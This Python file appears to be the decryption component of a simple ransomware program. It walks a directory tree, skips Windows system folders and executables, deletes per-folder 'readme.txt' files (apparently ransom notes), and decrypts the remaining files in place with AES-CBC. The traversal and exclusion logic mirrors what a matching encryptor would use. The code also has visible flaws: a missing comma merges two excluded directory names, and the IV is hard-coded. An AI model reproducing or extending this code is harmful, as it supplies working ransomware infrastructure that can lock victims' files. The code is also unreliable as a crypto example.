from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import os
iv = "This is an IV456"

class Decrypter:
    EXCLUDE_DIRECTORY = ['Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData'
                        'Program Files']

    EXCLUDE_EXTENSION = ('.dll',
                        '.img',
                        '.exe')
    def __init__(self,key,folder) :
        self.key = key
        self.iv = iv
        self.folder = folder
        
    def decrypt(self,ciphertext):
        cipher2 = AES.new(self.key.encode(),AES.MODE_CBC,iv.encode())
        plaintext2 = unpad(cipher2.decrypt(ciphertext),16)
        return(plaintext2)

    def decrypter(self,filename):
        f = open(filename,'rb')
        plaintext = f.read()
        f.close()

        f = open(filename,'wb')
        decrypted = self.decrypt(plaintext)
        f.write(decrypted)
        f.close()

    def mainencoder(self):
        try:
            for (roots,dirs,files) in os.walk(self.folder):
                if any(s in roots for s in self.EXCLUDE_DIRECTORY):
                    pass
                else:
                    for i in files:
                        readme = roots+'\\readme.txt'
                        if os.path.exists (readme):
                            os.remove(readme)
                            print('removed :'+roots+'readme.txt')
                        
            for (roots,dirs,files) in os.walk(self.folder):
                if any(s in roots for s in self.EXCLUDE_DIRECTORY):
                    pass
                else:
                    for x in files:
                        filename = roots+"\\"+x
                        if filename.endswith(self.EXCLUDE_EXTENSION):
                            pass
                        else:
                            print('files decrypted: ',filename)
                            self.decrypter(filename)
            return True
        except Exception as e:
            print(e)
            return False



